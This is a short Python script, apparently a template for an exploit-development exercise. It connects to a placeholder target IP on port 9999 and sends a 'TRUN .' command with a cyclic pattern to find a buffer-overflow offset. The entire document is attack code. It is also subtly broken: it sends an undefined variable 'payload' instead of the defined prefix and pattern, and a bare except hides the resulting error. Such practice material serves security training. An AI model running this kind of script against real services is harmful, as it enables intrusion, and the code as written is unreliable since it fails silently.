#!/usr/bin/python3
import socket, sys
from time import sleep

host = "<Target IP> "
port = 9999

prefix = "TRUN ."
pattern = " <Enter your pettern> "
try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending Payloads")
    s.send(bytes(payload, "latin-1"))
    s.recv(1024)
    
except:
  print("Try Again!!")
  sys.exit(0)

